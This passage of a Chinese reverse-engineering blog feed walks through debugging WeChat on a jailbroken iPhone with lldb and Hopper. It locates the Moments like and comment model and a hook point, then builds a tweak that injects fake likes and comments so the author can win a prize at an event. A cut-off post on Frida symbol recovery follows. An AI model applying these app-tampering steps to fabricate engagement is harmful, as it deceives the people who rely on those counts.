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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="Accessibility" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Accessibility/"/>
    
  </entry>
  
  <entry>
    <title>微信集赞/评论插件分析及开发</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/</id>
    <published>2019-07-22T02:22:01.000Z</published>
    <updated>2019-07-28T13:58:12.611Z</updated>
    
    <content type="html"><![CDATA[<h3 id="微信集赞-评论插件分析及开发"><a href="#微信集赞-评论插件分析及开发" class="headerlink" title="微信集赞/评论插件分析及开发"></a>微信集赞/评论插件分析及开发</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>为什么要做这个集赞的插件呢？起因是上周去参加了某个会议，有一个集赞60领玩偶的活动，但是想到平时一条朋友圈也就几个赞，而且又不想找人点赞，领不到，很气。回去以后想着能不能写一个集赞的插件，在需要的时候直接输入想要的赞、评论数量，我发的朋友圈就能有多少赞。这样再有这样的活动岂不美哉。准备开干！</p><h4 id="理性分析"><a href="#理性分析" class="headerlink" title="理性分析"></a>理性分析</h4><p>再开始之前，先理性分析一波：如果想要集赞，这里有两种思路，一个是直接在view层去更改，但是这样得去处理界面的一些细节，一旦不注意，很容易崩溃。还有种思路是更改datasource或者说赞评论的模型。可以想到，最初一条朋友圈肯定是从服务器拿到数据并封装成对应的模型。一般来说，越改底层的数据或者说源头的数据，那么稳定性和真实性就更高。这里我的想法就是既不改view层，也不改源头层，就改封装好的模型那一层应该就很符合要求。接下来主要讲一下怎么我去实现这个需求的分析过程，因为本身功能不是很复杂，大佬随便看看就行。</p><h4 id="准备条件"><a href="#准备条件" class="headerlink" title="准备条件"></a>准备条件</h4><ul><li>一台mac</li><li>一台越狱的iOS设备</li><li>ida/Hooper/theos</li><li>flex/issh/xia0LLDB</li><li>其他常见逆向工具等</li></ul><p>对于一贯喜欢上调试器分析得我，所以写了<a href="https://github.com/4ch12dy/issh">iSSH</a>和<a href="https://github.com/4ch12dy/xia0LLDB">xia0LLDB</a>两个工具，在这两个工具的辅助下整个插件用了2小时就完成了逆向分析和代码实现。</p><h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><h5 id="逆向赞和评论的数据模型"><a href="#逆向赞和评论的数据模型" class="headerlink" title="逆向赞和评论的数据模型"></a>逆向赞和评论的数据模型</h5><p>一切从界面入手，这里分析界面我一般喜欢用flex，在微信的朋友圈界面，用flex很容易发现当前界面的控制器为<code>WCTimeLineViewController</code>而且界面是一个<code>UITableView</code></p><p>将wechat执行文件拖入Hooper（<del>wechat文件太大，ida分析会很卡</del>）找到UITableView的代理方法：<br><code>-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]</code></p><p>这里面肯定会根据模型去设置cell数据</p><pre><code class="objective-c">  r2 = [r28 section];  var_70 = r25;  r24 = [r25 calcDataItemIndex:r2];  r25 = [[MMServiceCenter defaultCenter] retain];  r2 = [WCFacade class];  var_78 = r28;  r0 = [r25 getService:r2];  r0 = [r0 retain];  r24 = [[r0 getTimelineDataItemOfIndex:r24] retain];  [r0 release];  [r25 release];  r19 = [[MMServiceCenter defaultCenter] retain];  r0 = [r19 getService:[WCFacade class]];  r0 = [r0 retain];  r25 = [[r0 getLayerIdForDataItem:r24] retain];  [r0 release];  [r19 release];  r19 = [[MMServiceCenter defaultCenter] retain];  r0 = [r19 getService:[WCFacade class]];  r0 = [r0 retain];  r20 = r0;  r0 = [r0 getShowTip:r24 layerId:r25];  r29 = r29;  r26 = [r0 retain];  [r20 release];  [r19 release];</code></pre><p>整理下来就是</p><p><code>[[MMServiceCenter defaultCenter] getService:[WCFacade class]]</code>会得到一个<code>WCFacade</code>对象，然后通过</p><p><code>[WCFacade getTimelineDataItemOfIndex:]</code>就能得到cell的数据</p><p>看到这里，上调试器！看下都是什么数据…</p><p>将设备用数据线连接上电脑（这里我推荐用数据线的方式，wifi延时太高，影响心情），手机上打开微信</p><p>直接输入<code>issh debug -a wechat</code>就能挂上微信</p><pre><code class="shell">xia0 ~ $ issh debug -a wechat[I]:iproxy process for 2222 port alive, pid=1382[I]:++++++++++++++++++ Nice to Work :) +++++++++++++++++++++[I]:iOSRE dir exist[I]:iproxy process for 1234 port alive, pid=1395[I]:Run ps -e | grep debugserver | grep -v grep; [[ 0 == 0 ]] &amp;&amp; (killall -9 debugserver 2&gt; /dev/null)[I]:/iOSRE/tools/debugserver file exist, Start debug...[I]:Run /iOSRE/tools/debugserver 127.0.0.1:1234 -a wechat</code></pre><p>打开另一个终端进行调试（我的lldb已经安装了xia0LLDB脚本）</p><pre><code>xia0 ~ $ lldb&quot;xutil&quot; command installed -&gt; xutil&quot;choose&quot; command installed -&gt; choose&quot;xbr&quot; command installed --&gt; xbr -[UIView initWithFrame:]&quot;sbt&quot; command installed -&gt; sbt// 连接到远端(lldb) pcc</code></pre><p>这里有两种方法：</p><p>一种是用<code>xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;</code>下断点去查看；</p><pre><code>// 对-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]方法下断点(lldb) xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;(lldb) c</code></pre><p>第二种是由于lldb支持choose命令，可以直接拿到<code>WCFacade</code>对象。既然如此选choose</p><pre><code>(lldb) choose WCFacade&lt;__NSArrayM 0x2823d9860&gt;(&lt;WCFacade: 0x139e1c030&gt;)</code></pre><p>调用其<code>getTimelineDataItemOfIndex:</code>方法就能拿到第一条朋友圈的数据</p><pre><code>(lldb) po [0x139e1c030 getTimelineDataItemOfIndex:0]Class name: WCDataItem, addr: 0x13e2871d0tid: 13121667995275047007username: wxid_6913ohfkk7kq12createtime: 1564224719commentUsers: ()contentObj: &lt;WCContentItem: 0x2801f5500&gt;</code></pre><p>输入<code>ivars 0x13e2871d0</code>就能拿到对象的所有属性值</p><pre><code>(lldb) ivars 0x13e2871d0&lt;WCDataItem: 0x13e2871d0&gt;:in WCDataItem:    cid (int): 0    tid (NSString*): @&quot;13121667995275047007&quot;    type (int): 0    flag (int): 0    username (NSString*): @&quot;wxid_6913ohfkk7kq12&quot;    nickname (NSString*): @&quot;xia0&quot;    createtime (int): 1564224719    locationInfo (WCLocationInfo*): &lt;WCLocationInfo: 0x2801f7800&gt;    likeFlag (BOOL): NO    likeCount (int): 0    likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x286152d90&gt;    commentCount (int): 0    commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x2861539c0&gt;    contentObj (WCContentItem*): &lt;WCContentItem: 0x2801f5500&gt;    appInfo (WCAppInfo*): &lt;WCAppInfo: 0x287404080&gt;    contentDesc (NSString*): @&quot;test&quot;</code></pre><p>由于属性太多，这里我就只显示了一些比较关心的数据，可以看到这就是我发的一条内容为test的朋友圈。</p><p>里面我们还发现了<code>likeUsers</code>和<code>commentUsers</code>的字段，冷静思考就知道应该就是对应的赞和评论列表。我先给自己点个赞看下里面的数据。</p><pre><code>likeCount (int): 1likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e37060&gt;</code></pre><p>发现赞的数量变为1了，在看下里面的内容</p><pre><code>(lldb) po 0x283e37060&lt;__NSArrayM 0x283e37060&gt;(Class name: WCUserCommentusername: wxid_6913ohfkk7kq12nickname: xia0content:source: 0type: 1createTime: 1564225007isLocalAdded: 0commentID: (null)comment64ID: (null)refCommentID: (null)refComment64ID: (null)refUserName:bDeleted: 0)</code></pre><p>正是我自己的微信号。同理可以得到评论</p><pre><code>commentCount (int): 1commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e349c0&gt;(lldb) po 0x283e349c0&lt;__NSArrayM 0x283e349c0&gt;(Class name: WCUserCommentusername: wxid_6913ohfkk7kq12nickname: xia0content: 评论测试source: 0type: 2createTime: 1564225144isLocalAdded: 1commentID: (null)comment64ID: (null)refCommentID: (null)refComment64ID: (null)refUserName: (null)bDeleted: 0)</code></pre><p>到这里我们还可以发现赞和评论都是一个类（模型），只是里面的类型字段不同。现在我们其实已经拿到了我们想要的数据模型了。但是还有一个问题在于我们应该什么时候去更改这些数据呢？也就是我们说的hook点。</p><p>最好的hook可以想到是每次刷新数据的时候，这样我们的数据就是最新的。</p><h5 id="寻找HOOK点"><a href="#寻找HOOK点" class="headerlink" title="寻找HOOK点"></a>寻找HOOK点</h5><p>先想一下，刷新数据的时候，当拿到新的数据肯定会封装为一个<code>WCDataItem</code>对象，那么我们可以对<code>WCDataItem</code>里面的方法下断点，然后打印调用链不就反向得到了刷新的函数了吗？</p><p>但是逆向和调试过微信的人都知道，当你使用bt命令的时候只能得到一堆无符号的调用栈像下面这样</p><pre><code>(lldb) bt* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 4.1  * frame #0: 0x000000010857d4d0 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 30312888    frame #1: 0x0000000194fcc638 Foundation`_decodeObjectBinary + 2004    frame #2: 0x0000000194fcbb6c Foundation`_decodeObject + 340    frame #3: 0x0000000194ed24fc Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228    frame #4: 0x0000000194f2a09c Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92    frame #5: 0x0000000105a88404 WeChat`int fmt::internal::CharTraits&lt;char&gt;::format_float&lt;long double&gt;(char*, unsigned long, char const*, unsigned int, int, long double) + 2432992    frame #6: 0x0000000108da9ea8 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38884240    frame #7: 0x0000000108daa890 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38886776    frame #8: 0x0000000108dad178 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38897248    frame #9: 0x0000000108717394 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 31991932</code></pre><p>但是用我写的sbt命令就能恢复oc符号，下面我们对<code>-[WCDataItem setCid:]</code>下断点，然后得到调用栈</p><pre><code>(lldb) sbt==========================================xia0LLDB==========================================  BlockSymbolFile    Not Set The Block Symbol Json File, Try &#39;sbt -f&#39;============================================================================================  frame #0: [file:0x103c094d0 mem:0x10857d4d0] WeChat`-[WCDataItem setCid:] + 0  frame #1: [file:0x18193c638 mem:0x194fcc638] Foundation`_decodeObjectBinary + 2004  frame #2: [file:0x18193bb6c mem:0x194fcbb6c] Foundation`_decodeObject + 340  frame #3: [file:0x1818424fc mem:0x194ed24fc] Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228  frame #4: [file:0x18189a09c mem:0x194f2a09c] Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92  frame #5: [file:0x101114404 mem:0x105a88404] WeChat`+[CUtility SafeUnarchiveFromData:] + 64  frame #6: [file:0x104435ea8 mem:0x108da9ea8] WeChat`-[WCAdvertiseDataHelper hasCommented:] + 116  frame #7: [file:0x104436890 mem:0x108daa890] WeChat`-[WCAdvertiseDataHelper IsAdvertiseDataValid:] + 48  frame #8: [file:0x104439178 mem:0x108dad178] WeChat`-[WCAdvertiseDataHelper getAdvertiseDataByCurMinTime:MaxTime:] + 552  frame #9: [file:0x103da3394 mem:0x108717394] WeChat`Maybe c function? Distance:3348 &gt;= 2500 # Symbol:-[WCTimelineMgr tryRemoveCachesOfLikeUserWithNewTimelineList:] + 3348  frame #10: [file:0x206a0 mem:0x1131f06a0] WeChat`-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:] + 233  frame #11: [file:0x103db00c8 mem:0x1087240c8] WeChat`Maybe c function? Distance:9732 &gt;= 2500 # Symbol:-[WCTimelineDataProvider responseForSnsTimeLineResponse:Event:] + 9732  frame #12: [file:0x103db0398 mem:0x108724398] WeChat`-[WCTimelineDataProvider MessageReturn:Event:] + 112  frame #13: [file:0x1033923c0 mem:0x107d063c0] WeChat`-[CAppObserverCenter NotifyFromMainCtrl:Event:] + 336  frame #14: [file:0x104c292f8 mem:0x10959d2f8] WeChat`-[CMainControll TimerCheckEvent] + 728  frame #15: [file:0x1800a3604 mem:0x193733604] libobjc.A.dylib`-[NSObject performSelector:withObject:] + 68  frame #16: [file:0x101cb1fa8 mem:0x106625fa8] WeChat`-[MMNoRetainTimerTarget onNoRetainTimer:] + 84  frame #17: [file:0x1819750bc mem:0x1950050bc] Foundation`__NSFireTimer + 88  frame #18: [file:0x180e3d0a4 mem:0x1944cd0a4] CoreFoundation`__CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__ + 32  frame #19: [file:0x180e3cdd0 mem:0x1944ccdd0] CoreFoundation`__CFRunLoopDoTimer + 884  frame #20: [file:0x180e3c5c4 mem:0x1944cc5c4] CoreFoundation`__CFRunLoopDoTimers + 252  frame #21: [file:0x180e37284 mem:0x1944c7284] CoreFoundation`__CFRunLoopRun + 1832  frame #22: [file:0x180e36844 mem:0x1944c6844] CoreFoundation`CFRunLoopRunSpecific + 452  frame #23: [file:0x1830e5be8 mem:0x196775be8] GraphicsServices`GSEventRunModal + 104  frame #24: [file:0x1ae78431c mem:0x1c1e1431c] UIKitCore`UIApplicationMain + 216  frame #25: [file:0x100152b04 mem:0x104ac6b04] WeChat`main + 1387268  frame #26: [file:0x1808ec020 mem:0x193f7c020] libdyld.dylib`start + 4</code></pre><p>可以看到调用栈的符号已经恢复了，能够清晰的看出调用的过程</p><p>其中里面有个很明显的方法</p><p><code>-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:]</code></p><p>看名字就知道，这个应该就是我们需要的hook点。</p><h5 id="整理思路"><a href="#整理思路" class="headerlink" title="整理思路"></a>整理思路</h5><p>整理一下目前的情况，首先拿到了赞和评论的模型，然后找到了hook点。下一步就是写代码去实现集赞的功能。</p><p>大概的代码逻辑应该如下</p><ul><li>在hook点的时候拿到原始的朋友圈数据，并过滤出自己的那条朋友圈</li><li>取出自己朋友圈的赞和评论数据备用</li><li>随机从通讯录好友里面选择数量去构造赞和评论对象，并放入原朋友圈赞和评论列表里面</li></ul><p>下面就是写代码实现就可以了。还有个情况是在你进入自己的朋友圈详情界面的时候，也就是看到点赞的人都是头像的界面。也需要做类似的操作才能实现集赞的功能。</p><p>这里分析的过程和上面类似，我选择的hook点为：<br><code>-[WCCommentDetailViewControllerFB setDataItem:]</code></p><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p>具体的代码实现这里就不再去分析了，我把代码开源到了这里<a href="https://github.com/4ch12dy/fkwechatzan">fkwechatzan</a></p><h4 id="完成效果"><a href="#完成效果" class="headerlink" title="完成效果"></a>完成效果</h4><ul><li><p>集赞助手设置界面</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1361564255775_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p></li></ul><ul><li><p>朋友圈详情界面</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1341564229215_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p></li><li><p>赞和评论</p></li></ul><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1321564227655_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p><h4 id="一点总结"><a href="#一点总结" class="headerlink" title="一点总结"></a>一点总结</h4><p>本文详细介绍了使用issh和xia0LLDB去完成一个集赞功能的逆向分析过程，这个功能本身不是很复杂，这里仅仅我在逆向过程中的一些理解和分析。每个人的逆向分析过程可能都不尽相同，我提供一个完整的分析步骤，而不是完全的去靠猜测，虽然逆向有时候猜测就能有一些意外惊喜，不过不确定性也同样会花费大量时间。</p><p>最后，妈妈再也不用担心没有人赞我的朋友圈了~</p><p>下次集赞领礼品的活动我要定了！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;微信集赞-评论插件分析及开发&quot;&gt;&lt;a href=&quot;#微信集赞-评论插件分析及开发&quot; class=&quot;headerlink&quot; title=&quot;微信集赞/评论插件分析及开发&quot;&gt;&lt;/a&gt;微信集赞/评论插件分析及开发&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot;
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Frida调用栈符号恢复</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/</id>
    <published>2019-07-02T09:00:14.000Z</published>
    <updated>2019-08-01T07:53:10.362Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Frida调用栈符号恢复"><a href="#Frida调用栈符号恢复" class="headerlink" title="Frida调用栈符号恢复"></a>Frida调用栈符号恢复</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>搞了一阵子的Android方向的逆向研究，发现用frida去做一些hook等测试十分方便。最近自己想在iOS平台实现短视频下载去水印的问题，所以也想用frida来试试。但是测试过程中当我想去看下hook点的调用栈的时候，发现只有一些栈地址，基本没有符号信息，估计符号表被strip了。这里通常的做法就是用这些地址减去偏移然后去ida里面找到对应的方法。这样无疑是大大增加了分析的时间，想到之前解决<a href="[http://4ch12dy.site/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/](http://4ch12dy.site/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/">lldb调试器栈符号恢复</a>)方案，决定把lldb的栈符号恢复脚本移植到frida中。</p><h4 id="如何恢复已经去掉符号表的可执行文件？"><a href="#如何恢复已经去掉符号表的可执行文件？" class="headerlink" title="如何恢复已经去掉符号表的可执行文件？"></a>如何恢复已经去掉符号表的可执行文件？</h4><p>这里的符号恢复仅仅针对的是OC函数，C函数如果符号表被strip以后是没有办法恢复其符号信息的。为什么OC函数可以去做符号恢复呢？这里要涉及到macho文件的格式以及ObjectC这个语言自身设计相关。可以看到在macho文件中的_DATA数据段中有很多objc的节信息，里面保存了所有的类以及方法等元数据信息。既然如此，我们肯定能找到方法去恢复这些OC函数的符号。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702172303432.png?raw=true" alt="image-20190702172303432"></p><h4 id="OC函数符号恢复思路"><a href="#OC函数符号恢复思路" class="headerlink" title="OC函数符号恢复思路"></a>OC函数符号恢复思路</h4><p>首先我们只能得到一堆调用链的地址，这些地址肯定是函数里面的某个偏移地址。很容易想到这个地址往前推肯定就是这个函数的首地址及函数地址。如果我们拿到了所有函数的地址，然后每一个地址和目标地址比较，与目标地址距离最近的那个地址所对应的函数不就是我们想要的符号吗。</p><p>根据上面提到的思路，目前需要解决几个问题，怎么拿到所有OC方法的地址? 以及对应的类名和方法名?如何设计匹配算法等？</p><p>这里有两种办法：</p><ul><li>第一种是自己去解析在内存中加载的macho文件，根据macho的文件格式先找到class信息，然后找到对应的method信息，method里面就保存了IMP和方法名。之前我尝试这样去过，所有的信息都能拿到，但是由于在macho在加载到内存的时候objc动态库会做很多的初始化等工作，导致要处理一些细节问题，所以就没继续做了。</li><li>第二种是利用已有的objc提供的接口objc_去拿到所有的class以及对应method的方法名和IMP。这里主要用的的API有<code>objc_copyClassNamesForImage</code>、<code>class_copyMethodList</code> 、<code>objc_getClass</code>、<code>method_getImplementation</code>、<code>method_getName</code>、<code>objc_getClass</code>、<code>objc_getMetaClass</code></li></ul><p>现在已经能拿到所有的类方法、方法名、方法实现地址了，接下来要解决的就是怎么通过调用栈的地址去找到对应的方法，这里的思路就是遍历所有的方法地址与调用栈的地址比较并计算距离，如果方法地址小于目标地址且距离最小，那么该方法就是我们要找到的符号。最后将调用栈上面的所有地址都进行该操作即可。</p><h4 id="frida的js环境编写代码"><a href="#frida的js环境编写代码" class="headerlink" 